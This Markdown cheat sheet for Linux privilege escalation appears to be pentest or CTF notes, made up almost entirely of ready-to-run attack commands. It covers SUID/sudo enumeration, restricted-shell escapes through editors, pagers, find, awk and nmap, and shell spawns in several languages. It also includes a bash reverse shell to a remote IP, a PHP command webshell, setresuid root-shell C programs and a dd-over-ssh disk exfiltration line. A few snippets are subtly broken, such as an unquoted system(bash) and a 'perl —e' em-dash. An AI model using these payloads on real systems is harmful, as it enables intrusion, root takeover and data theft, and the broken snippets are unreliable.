# Search for Commands that run as Root:
## list all programs this account has sudo access to
```
sudo -l
```

## find all files with SUID & SGID set
```
find . -perm /2000 
find / -perm -4000 -o -perm -2000
find / -perm -u=s -type f 2>/dev/null
find / -perm /6000
find / -perm /6001   
```


## Restricted Shells: rbash, rksh, rzsh, lshell and rssh
1. try ls, cd, pwd, echo commands [if these commands are restricted, 
   an error will show up with the type of restricted shell we are in (most of the time, this is rbash)]
2. press tab twice to see what commands are available.
  a. if "ls" is avaiable list binaries in /bin, /usr/bin, /usr/local/bin
  b. echo /usr/bin/*  [use globbing to list directory contents]
  c. important to check for operators and escape characters such as the following:
  ```
     > >> < | & ; : ' " `
  ```
3. Try commands wrapped
```
(whoami)
{whoami}
```

## Shell Execution:
```
find /home -exec sh -i \;
```
## use text editors vim, vi, nano, pico, ed
```
:!/bin/sh, !/bin/zsh, try other shells!?!?
:shell
:set shell=/bin/sh
:set shell=/bin/bash:shell
:!bash
```

## use pagers less, more, or programs like man that use less or more by default
```
!/bin/sh, !/bin/zsh, try other shells!?!?
!/bin/bash
!bash
```

## find
use find command’s exec parameter for code execution (returns shell)
```
sudo find /home -exec sh -i \;
find /var/log -name messages -exec /bin/bash -i \;
```

## use awk command
```
awk 'BEGIN {system("/bin/sh")}'
```

## use expect command
```
expect
spwan sh
sh
```

## use tee command to create a script in scenarios where text editors aren't available
```
echo "bash -i" | tee script.sh
```

## use nmap command
```
nmap --interactive
nmap> !sh
```

## use ssh with the following options to escape restricted shell 
```
ssh user@IP -t "bash --noprofile"
ssh user@IP -t "/bin/sh"
```

## Reverse Shell:

```
bash -i >& /dev/tcp/<ip-address>/<port> 0>&1
```

# Programming Language:
## Python:
```
import os; os.system("/bin/sh")
```

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

## PHP:
```
exec("sh -i");
```

## PHP Webshell:
```
<?php
  $command = $_GET['cmd'];
  echo system($command);
?>
```

## Perl:
```
exec "/bin/sh";
```
```
perl —e 'exec "/bin/sh";'
```

## Ruby:
```
exec "/bin/sh"
```
```
ruby -e 'exec "/bin/sh"'
```

## IRB:
```
exec "/bin/sh"
```

## Lua:
```
os.execute("/bin/sh")
```

## C:
```
#include <stdio.h>

int main(int argc, char **argv)
{
	int status = system(bash);
	return 0;
}
```
```
int main(void){
    setresuid(0, 0, 0);
    system("/bin/bash");
}
```
```
int main(void){
       setresuid(0, 0, 0);
       system("/bin/sh");
}       
```

### Building the SUID Shell binary
```
gcc -o suid suid.c 
gcc -o exploit exploit.c
``` 

### For 32 bit:
```
gcc -m32 -o suid suid.c  
gcc -m32 exploit.c -o exploit
```

### Compile Windows .exe on Linux
Build / compile windows exploits on Linux, resulting in a .exe file.
```
i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
```


# Encrypted exfil channel:
```
dd if=/dev/<disk-to-copy> bs=65536 conv=noerror, sync | ssh -C <user>@<ip-address> "cat > /tmp/image.dd"
```



